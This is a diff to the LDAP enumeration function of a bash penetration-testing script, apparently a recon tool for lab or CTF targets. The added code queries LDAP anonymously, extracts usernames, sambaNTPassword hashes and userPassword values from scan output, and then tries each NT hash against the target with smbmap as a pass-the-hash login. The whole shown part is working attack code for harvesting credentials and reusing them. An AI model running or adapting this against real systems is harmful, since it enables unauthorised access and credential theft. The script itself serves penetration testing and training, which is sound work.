@@ -696,6 +696,34 @@ ldap_enum() {
         echo -e "${DOPE} Found LDAP! Running nmap ldap scripts"
         echo -e "${DOPE} nmap -vv -Pn -sV -p 389 --script='(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)' -oA nmap/ldap-$rhost $rhost"
         nmap -vv -Pn -sV -p 389 --script='(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)' -oA nmap/ldap-$rhost $rhost
+        echo -e "${DOPE} ldapsearch -x -h $rhost -s base namingcontexts"
+        ldapsearch -x -h $rhost -s base namingcontexts | tee ldap-namingcontexts-$rhost.log
+        dcList=$(sed -n -e 's/^.*namingContexts: //p' ldap-namingcontexts-$rhost.log)
+        # dcList=$(sed -n -e 's/^.*namingContexts: //p' ldap-namingcontexts-$rhost.log | tr ',' '\n' | cut -d '=' -f 2)
+        echo -e "${DOPE} ldapsearch -x -h $rhost -s base -b $dcList"
+        ldapsearch -x -h $rhost -s base -b $dcList | tee ldap-base-$rhost.log
+        echo -e "${DOPE} ldapsearch -x -h $rhost -s sub -b $dcList"
+        ldapsearch -x -h $rhost -s sub -b $dcList | tee ldap-sub-$rhost.log
+        ldapUserNames=$(sed -n -e 's/^.*uid=//p' nmap/ldap-$rhost.nmap | cut -d ',' -f 1)
+        sambaNTPassword=$(sed -n -e 's/^.*sambaNTPassword: //p' nmap/ldap-$rhost.nmap)
+        ldapUserPasswords=$(sed -n -e 's/^.*userPassword: //p' nmap/ldap-$rhost.nmap)
+
+        sortUsers() {
+            for user in $ldapUserNames; do
+                if [[ -n $sambaNTPassword ]]; then
+                    if (($(grep -c . <<<"$sambaNTPassword") > 1)); then
+                        for hash in $sambaNTPassword; do
+                            echo -e "${DOPE} smbmap -u $user -p "$hash:$hash" -H $rhost -R"
+                            smbmap -u $user -p "$hash:$hash" -H $rhost -R
+                        done
+                    else
+                        echo -e "${DOPE} smbmap -u $user -p "$sambaNTPassword:$sambaNTPassword" -H $rhost -R"
+                        smbmap -u $user -p "$sambaNTPassword:$sambaNTPassword" -H $rhost -R
+                    fi
+                fi
+            done
+        }
+        sortUsers
         if [[ ! -s smb-scan-$rhost.log ]]; then
             echo -e "${DOPE} Found LDAP! Running Enum4Linux"
             enum4linux -a -l -v $rhost | tee ldapenum-$rhost.txt
